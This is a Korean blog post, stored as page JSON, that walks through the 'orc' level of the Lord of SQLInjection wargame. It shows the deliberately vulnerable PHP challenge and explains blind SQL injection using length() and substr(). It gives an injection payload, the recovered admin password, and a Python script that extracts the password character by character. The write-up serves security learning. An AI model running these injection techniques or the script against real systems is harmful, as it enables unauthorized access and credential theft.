{"pageProps":{"post":{"slug":"2017-08-12-LOS-orc","content":"\n### https://los.eagle-jump.org/ 버전\n![](/assets/posts/los/orc.png)\n\n`query: select id from prob_orc where id='admin' and pw=''`\n\n```php\n<?php \n  include \"./config.php\"; \n  login_chk(); \n  dbconnect(); \n  if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[pw])) exit(\"No Hack ~_~\"); \n  $query = \"select id from prob_orc where id='admin' and pw='{$_GET[pw]}'\"; \n  echo \"<hr>query : <strong>{$query}</strong><hr><br>\"; \n  $result = @mysql_fetch_array(mysql_query($query)); \n  if($result['id']) echo \"<h2>Hello admin</h2>\"; \n  $_GET[pw] = addslashes($_GET[pw]); \n  $query = \"select pw from prob_orc where id='admin' and pw='{$_GET[pw]}'\"; \n  $result = @mysql_fetch_array(mysql_query($query)); \n  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve(\"orc\"); \n  highlight_file(__FILE__); \n?>\n```\n\norc 문제는 저번 문제와 다르게 id='admin'으로 고정되어 있고, 입력받은 pw가 db에 있는 pw와 같아야한다.\nblind sql injection 문제이고 admin의 pw를 알아야만 문제가 풀린다.\nlength 함수와 substr 함수로 문제를 풀 것이다.\npython으로 코드를 짜서 하는 방법도 있지만 LOS의 첫번째 blind sql injection 문제이므로 수동으로 풀어보겠다.\n\n![](/assets/posts/los/orc_admin.png)\n\n`pw=1%27or%20id=%27admin%27%20and%20length(pw)=%278`\n\n이런식으로 length(pw)='1 부터 Hello admin이 뜨는 숫자를 찾으면 된다.\norc 문제에서 pw의 길이는 8\n\nsubstr 함수는 문자열이나 변수에서 특정위치부터 정해진 길이만큼 자르는  함수이고 이를 이용해 문제를 해결할 수 있다.\nsubstr(pw,1,1)=1 이라고 한다면 pw의 첫번째 글자가 1인지 확인할 수 있겠다.\npw의 길이는 8이므로 substr(pw,1,1) 부터 substr(pw,8,1) 을 해주면서\n값으로는 숫자,알파벳,특수문자 등을 넣으면서 pw를 한글자씩 확인할 수 있다.\nblind sql injection이기 때문에 숫자,알파벳,특수문자가 들어가는지 안들어가는지 모르고 직접 손으로 확인하기엔 경우의 수가 너무 많기 때문에 코드를 짜서 푸는 것이다.\n\n![](/assets/posts/los/orc_admin_1.png)\n![](/assets/posts/los/orc_admin_2.png)\n![](/assets/posts/los/orc_admin_3.png)\n![](/assets/posts/los/orc_admin_4.png)\n![](/assets/posts/los/orc_admin_5.png)\n![](/assets/posts/los/orc_admin_6.png)\n![](/assets/posts/los/orc_admin_7.png)\n![](/assets/posts/los/orc_admin_8.png)\n\n다행히 숫자와 알파벳밖에 없었기 때문에 금방 풀렸으나 조금더 난이도 높은 pw 였다면 직접 손으로 하기엔 어려움이 있을 것이다.\nHello admin이 뜨는 경우만 봤을때 admin의 pw는 **295d5844** 이다.\n이 값을 admin의 pw에 넣어주면 문제가 풀린다.\n\n![](/assets/posts/los/orc_clear.png)\n\n오크 클리어!\n\n\n### https://los.rubiya.kr 버전\neagle-jump 페이지와 rubiya 페이지의 답이 달랐다.\n다시 풀기 귀찮아서 코드로 짰다.\n\n```py\nfrom requests import get\nimport string\nfrom time import sleep\n\nurl = \"https://los.rubiya.kr/chall/orc_~~.php\"\n\ncookies = dict(PHPSESSID=\"\")\nspecial_strings = \"~!@#$%^&*()+-_{}[]<>\"\nalpha = string.ascii_letters+string.digits+special_strings\nresult = \"\"\n\nfor i in range(1,20):\n    parameter = \"?id=admin&pw=1'or id='admin' and length(pw)='\"+ str(i) + \"%23\"\n    new_url = url + parameter\n    r = get(new_url, cookies=cookies)\n\n    if r.text.find(\"Hello admin\") > 0:\n        length = i + 1\n        print(\"password length is \" + str(i))\n        break\nfor i in range(1, length):\n    for a in alpha:\n        parameter = \"?id=admin&pw=1'or id='admin' and ASCII(substr(pw,\"+ str(i)+\",1))=\"+str(ord(a))+\"%23\"\n        new_url = url + parameter\n        r = get(new_url, cookies=cookies)\n\n        if r.text.find(\"Hello admin\") > 0:\n            print(str(i) + \" -> \" + a)\n            result += a\n            break\n\n    if i == 1 and result == \"\":\n        print(\"password not found\")\n        exit(0)\n\n    if i == length-1:\n        print(\"\\npassword is \"+result)\n        print(\"\\n\")\n```\n\n![](/assets/posts/los/orc_result.png)\n![](/assets/posts/los/orc_py_clear.png)\n","layout":"post","title":"[LOS] orc","categories":["LOS"],"excerpt":" ","comments":true,"share":true,"tags":["LOS","Web-hacking","orc","write-up"]}},"__N_SSG":true}